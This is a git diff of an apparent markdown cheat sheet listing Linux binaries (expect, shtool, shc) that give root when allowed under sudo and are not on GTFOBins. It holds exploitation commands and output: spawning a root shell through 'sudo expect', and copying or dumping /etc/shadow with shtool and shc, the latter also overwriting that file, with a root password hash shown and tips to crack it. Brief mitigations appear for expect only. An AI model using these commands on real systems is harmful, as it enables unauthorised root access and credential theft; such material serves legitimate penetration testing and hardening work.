@@ -1,4 +1,13 @@
-This document contains a list of binaries that have sudo permissions but are not found on GTFOBins for privilege escalation. While GTFOBins provides a well-documented collection of sudo-exploitable binaries, new or lesser-known binaries with potential privilege escalation (PrivEsc) capabilities may not yet be listed.
+# Unlisted Sudo Privilege Escalation Binaries (Not on GTFOBins)
+
+This document contains a list of binaries that have **sudo permissions** but are **not listed on GTFOBins** for privilege escalation.  
+
+While **GTFOBins** provides a well-documented collection of sudo-exploitable binaries, new or lesser-known binaries with **potential privilege escalation (PrivEsc) capabilities** may not yet be listed.  
+
+Each binary below is analyzed for privilege escalation techniques, exploitation steps, and possible mitigations.
+
+---
+
 ## `expect` - Sudo Privilege Escalation
 
 ### **Description**
@@ -9,34 +18,23 @@ If `expect` is allowed with `sudo`, you can escalate privileges using the follow
 
 ```sh
 sudo /usr/bin/expect
+At the expect prompt, execute:
+
 expect1.1> whoami
 root
-## `shtool` - Sudo Privilege Escalation  
+expect1.2> bash
+[root@my_privilege user]# id
+uid=0(root) gid=0(root) groups=0(root)
+Mitigation
 
-### **Description**  
-`shtool` is a script utility tool commonly used for installation tasks. If granted **sudo permissions**, it can be abused to copy sensitive system files (e.g., `/etc/shadow`) to a location accessible by a lower-privileged user, enabling privilege escalation.  
+    Remove sudo permissions for expect (/usr/bin/expect).
+    Restrict expect usage through sudoers configuration.
+    Use AppArmor or SELinux to prevent execution of unauthorized commands.
+shtool - Sudo Privilege Escalation
+Description
 
-### **Exploitation**  
-If `shtool` is available with `sudo`, you can copy `/etc/shadow` to a user-accessible directory and attempt **password cracking** to escalate privileges.  
+shtool is a script utility tool commonly used for installation tasks. If granted sudo permissions, it can be abused to copy sensitive system files (e.g., /etc/shadow) to a location accessible by a lower-privileged user, enabling privilege escalation.
+Exploitation
 
-```sh
-sudo shtool install -c /etc/shadow /home/user/shadow
-Now, verify the copied file:
-ls
-shadow
-cat shadow
-This will reveal hashed passwords, which can be cracked using tools like John the Ripper or hashcat.
-## `shc` - Sudo Privilege Escalation  
-
-### **Description**  
-`shc` (Shell Script Compiler) is used to compile shell scripts into binary executables. If it has **sudo permissions**, it can be exploited to reveal the **root password hash** from `/etc/shadow`.  
-
-### **Exploitation**  
-When `shc` is executed on `/etc/shadow` with `sudo`, it tries to interpret it as a script. Since the **first line of `/etc/shadow` contains the root user hash**, `shc` fails and **displays the root password hash by default**.  
-
-#### **Command:**  
-```sh
-sudo /usr/bin/shc -f /etc/shadow -o /etc/shadow
-shc: invalid first line in script: root:$6$lYoxb/H/0LQ5d50Q$mM2ej4Um6zmkg11uszJrBpZo/vI4TT6nEvQnlnI/GlB9otfNIyN9xXfATAxVAUzj4ojTE1pmFbY12NUzw2j/b0:18313:0:99999:7:::
-Here, the root password hash is exposed, allowing an attacker to extract and crack it using tools like John the Ripper or hashcat.
+If shtool is available with sudo, you can copy /etc/shadow to a user-accessible directory and attempt password cracking to escalate privileges.
 
